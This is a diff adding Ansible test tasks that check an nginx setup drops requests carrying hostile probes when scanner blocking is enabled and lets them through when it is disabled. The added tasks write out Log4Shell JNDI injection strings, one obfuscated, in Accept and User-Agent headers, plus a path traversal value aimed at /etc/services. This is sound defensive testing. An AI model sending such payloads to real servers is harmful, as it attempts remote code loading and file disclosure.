@@ -312,6 +312,42 @@
       changed_when: false
       failed_when: safe_scanner_response.rc not in [52, 56] or safe_scanner_response.stdout != '000'
 
+    - name: Test Log4Shell probe in Accept header to safe.local gets no response (blocked by default)
+      ansible.builtin.command: >
+        curl -s -o /dev/null -w '%{http_code}' -H 'Host: safe.local'
+        -H 'Accept: ${${a:-j}ndi:ldap://probe.example.com/a}'
+        http://127.0.0.1/
+      register: safe_log4shell_response
+      changed_when: false
+      failed_when: safe_log4shell_response.rc not in [52, 56] or safe_log4shell_response.stdout != '000'
+
+    - name: Test path traversal probe in Accept header to safe.local gets no response (blocked by default)
+      ansible.builtin.command: >
+        curl -s -o /dev/null -w '%{http_code}' -H 'Host: safe.local'
+        -H 'Accept: ../../../../etc/services'
+        http://127.0.0.1/
+      register: safe_traversal_response
+      changed_when: false
+      failed_when: safe_traversal_response.rc not in [52, 56] or safe_traversal_response.stdout != '000'
+
+    - name: Test Log4Shell probe in User-Agent header to safe.local gets no response (blocked by default)
+      ansible.builtin.command: >
+        curl -s -o /dev/null -w '%{http_code}' -H 'Host: safe.local'
+        -A '${jndi:ldap://probe.example.com/a}'
+        http://127.0.0.1/
+      register: safe_ua_probe_response
+      changed_when: false
+      failed_when: safe_ua_probe_response.rc not in [52, 56] or safe_ua_probe_response.stdout != '000'
+
+    - name: Test browser Accept header to safe.local works
+      ansible.builtin.command: >
+        curl -s -o /dev/null -w '%{http_code}' -H 'Host: safe.local'
+        -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+        http://127.0.0.1/
+      register: safe_accept_response
+      changed_when: false
+      failed_when: safe_accept_response.stdout != '200'
+
     - name: Test AI crawler user agent to safe.local gets no response (block_ai_crawlers enabled)
       ansible.builtin.command: >
         curl -s -o /dev/null -w '%{http_code}' -H 'Host: safe.local'
@@ -347,6 +383,15 @@
       register: open_scanner_response
       changed_when: false
       failed_when: open_scanner_response.stdout != '200'
+
+    - name: Test Log4Shell probe in Accept header to open.local works (block_security_scanners disabled)
+      ansible.builtin.command: >
+        curl -s -o /dev/null -w '%{http_code}' -H 'Host: open.local'
+        -H 'Accept: ${${a:-j}ndi:ldap://probe.example.com/a}'
+        http://127.0.0.1/
+      register: open_log4shell_response
+      changed_when: false
+      failed_when: open_log4shell_response.stdout != '200'
 
     # raw_actions tests (server-level raw nginx directives)
     - name: Check if raw_actions_test vhost exists
